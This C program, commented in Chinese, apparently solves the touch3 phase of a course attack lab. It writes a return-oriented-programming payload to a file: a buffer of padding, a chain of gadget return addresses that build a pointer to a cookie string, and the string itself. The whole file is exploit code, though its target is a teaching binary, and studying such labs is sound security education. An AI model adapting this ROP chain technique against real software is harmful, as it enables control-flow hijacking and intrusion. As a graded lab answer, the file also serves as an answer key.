#include <stdio.h>
 
int main()
{
    FILE *fp = NULL;
 
    fp = fopen("payload.raw", "wb");
   
    /*
        movq %rsp, %rax
        movq %rax,%rdi
        popq %rsi
        leaq (%rdi,%rsi), %rax
        movq %rax,%rdi
    */
    char buf[] = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 填充字符
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 填充字符
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 填充字符
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 填充字符
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 填充字符
        0xAD, 0x1A, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> movq %rsp, %rax
        0xAD, 0x1A, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> movq %rsp, %rax，无意义的执行，为了使栈对齐
        0xA2, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> movq %rax, %rdi
        0x83, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> popq %rsi
        0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // rsi value -> 48
        0xD6, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> leaq (%rdi,%rsi), %rax
        0xA2, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> movq %rax, %rdi
        0xFA, 0x18, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret addr -> touch3
        0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61,  // 字符串
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 填充字符
    };



    int r = fwrite(buf, sizeof(buf), 1, fp);
    printf("fwrite return %d\n", r);
    fclose(fp);
}
